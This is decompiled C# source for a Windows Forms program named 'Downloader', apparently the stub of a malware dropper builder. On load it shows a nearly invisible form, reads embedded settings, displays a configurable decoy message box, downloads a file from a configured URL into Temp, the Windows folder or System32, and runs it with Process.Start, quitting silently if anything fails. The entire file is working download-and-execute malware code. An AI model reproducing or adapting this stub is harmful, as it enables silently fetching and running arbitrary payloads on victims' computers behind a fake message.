using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Downloader.ExeBuilder;
using Downloader.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Downloader;

[DesignerGenerated]
public class Form1 : Form
{
	private static ArrayList __ENCList = new ArrayList();

	private IContainer components;

	private Loader bla;

	private string url;

	private string msg;

	private string msgtitle;

	private string msgboxtype;

	private string filename;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCList.Add(new WeakReference(this));
		bla = new Loader();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		if ((disposing && components != null) ? true : false)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(115, 0);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		//IL_018f: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			bla.LoadSettings();
			url = bla.Settings[0];
			msg = bla.Settings[1];
			msgtitle = bla.Settings[2];
			msgboxtype = bla.Settings[3];
			filename = bla.Settings[4];
			string[] array = filename.Split(new char[1] { '\\' });
			if (Operators.CompareString(array[0], "$Temp", false) == 0)
			{
				array[0] = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
			}
			else if (Operators.CompareString(array[0], "$WinDir", false) == 0)
			{
				array[0] = Environment.ExpandEnvironmentVariables("%WinDir%");
			}
			else if (Operators.CompareString(array[0], "$SysDir", false) == 0)
			{
				array[0] = Environment.ExpandEnvironmentVariables("%WinDir%") + "\\System32";
			}
			filename = array[0] + "\\" + array[1];
			if (Operators.CompareString(msgboxtype, "OK", false) == 0)
			{
				Interaction.MsgBox((object)msg, (MsgBoxStyle)0, (object)msgtitle);
			}
			else if (Operators.CompareString(msgboxtype, "OK_CAN", false) == 0)
			{
				Interaction.MsgBox((object)msg, (MsgBoxStyle)1, (object)msgtitle);
			}
			else if (Operators.CompareString(msgboxtype, "ERROR", false) == 0)
			{
				Interaction.MsgBox((object)msg, (MsgBoxStyle)16, (object)msgtitle);
			}
			else if (Operators.CompareString(msgboxtype, "OK_RETRY", false) == 0)
			{
				Interaction.MsgBox((object)msg, (MsgBoxStyle)5, (object)msgtitle);
			}
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(filename))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(filename);
			}
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(url, filename);
			Process.Start(filename);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}
}
